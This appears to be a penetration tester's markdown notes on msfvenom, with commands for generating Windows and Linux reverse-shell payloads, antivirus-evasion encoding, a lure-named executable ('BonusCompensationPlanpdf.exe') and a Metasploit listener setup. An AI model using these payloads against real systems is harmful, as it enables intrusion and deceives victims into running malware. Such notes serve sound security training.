---
id: Msfvenom
aliases: []
tags:
  - Pentest/Tools/Metasploit/Msfvenom
---

# Msfvenom

[MSFVenom](https://www.offsec.com/metasploit-unleashed/msfvenom/)
replaces [MSFPayload](https://www.offsec.com/metasploit-unleashed/msfpayload/)
and [MSFEncode](https://www.offsec.com/metasploit-unleashed/msfencode/)

<!-- Warning {{{-->
> [!warning]- Deprecated
>
> - [MSFPayload](https://www.offsec.com/metasploit-unleashed/msfpayload/):
>   Used to generate shellcode for a specific processor architecture
>   and OS release
> - [MSFEncode](https://www.offsec.com/metasploit-unleashed/msfencode/):
>   Used to removing bad characters (*hexadecimal opcodes*)
>   from shellcode and AV evasion
>
<!-- }}} -->

```sh
msfvenom -h
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
> ```
> ```sh
> Found 1 compatible encoders
> ```
<!-- }}} -->

___

<!-- List {{{-->
## List

List Payloads

```sh
msfvenom -l payloads
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfvenom -l payloads
> ```
> ```sh
> Framework Payloads (592 total) [--payload <value>]
> ==================================================
>
>     Name                                                Description
>     ----                                                -----------
> linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
> linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
> linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
> linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
> linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
> linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
> linux/x86/shell_find_port                           Spawn a shell on an established connection
> linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
> linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
> linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
>
> ...
> ```
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Build {{{-->
## Build

Build a custom payload

1. Generate payload

```sh
msfvenom -p <payload> -f <format> [options]
```

<!-- Info {{{-->
> [!info]-
>
> - `msfvenom`: Call msfvenom
> - `-p`: Define payload based on architecture
> - `-f`: Specify the format the generated binary will be in
>
<!-- }}} -->

<!-- Example - Windows {{{-->
> [!example]- Windows
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > Without any encoding or encryption,
> > the payload would almost certainly be detected by Windows Defender
> <!-- }}} -->
>
> Example 1
>
> ```sh
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x86 from the payload
> No encoder or badchars specified, outputting raw payload
> Payload size: 341 bytes
> Final size of aspx file: 2819 bytes
> ```
>
> Example 2
>
> ```sh
> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=1337 -f exe > BonusCompensationPlanpdf.exe
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x86 from the payload
> No encoder specified, outputting raw payload
> Payload size: 324 bytes
> Final size of exe file: 73802 bytes
> ```
>
<!-- }}} -->

<!-- Example - Linux {{{-->
> [!example]- Linux
>
> ```sh
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=1337 -f elf > createbackup.elf
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
> [-] No arch selected, selecting arch: x64 from the payload
> No encoder specified, outputting raw payload
> Payload size: 74 bytes
> Final size of elf file: 194 bytes
> ```
>
<!-- }}} -->

2. Set up [Generic Payload Handler](https://www.rapid7.com/db/modules/exploit/multi/handler/)

```sh
msfconsole -q
```
```sh
use multi/handler
```
```sh
set LHOST tun0
```
```sh
set LPORT 1337
```
```sh
exploit
```

___
<!-- }}} -->
